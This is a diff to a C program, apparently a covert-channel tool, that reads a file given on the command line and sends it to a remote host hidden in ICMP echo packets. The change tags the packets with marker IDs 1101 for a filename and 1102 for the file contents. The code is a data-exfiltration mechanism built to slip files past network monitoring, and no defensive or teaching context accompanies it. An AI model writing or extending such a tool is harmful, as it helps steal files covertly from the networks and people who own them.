@@ -9,7 +9,7 @@
 #include <sys/socket.h>
 
 uint16_t icmp_chk(void *buffer, int len);
-int covert_icmp(struct in_addr *dst, char *data);
+int covert_icmp(struct in_addr *dst, char *data, int code);
 
 int main(int argc, char *argv[]) {
     FILE *fp = fopen(argv[1], "rb");
@@ -28,12 +28,13 @@ int main(int argc, char *argv[]) {
     struct in_addr *dst;
 
     dst = (struct in_addr *)host->h_addr_list[0];
-
-    covert_icmp(dst, data);
+    
+    covert_icmp(dst, "filetest.c", 1101);
+    covert_icmp(dst, data, 1102);
     return 0;
 }
 
-int covert_icmp(struct in_addr *dst, char *data) {
+int covert_icmp(struct in_addr *dst, char *data, int code) {
     struct icmphdr icmp_hdr;
     struct sockaddr_in addr;
 
@@ -63,7 +64,7 @@ int covert_icmp(struct in_addr *dst, char *data) {
     memset(&icmp_hdr, 0, sizeof(icmp_hdr));
     icmp_hdr.type = ICMP_ECHO;
     icmp_hdr.checksum = 0;
-    icmp_hdr.un.echo.id = 1189;
+    icmp_hdr.un.echo.id = code;
 
     if((setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl))) < 0) {
         perror("setsockopt");
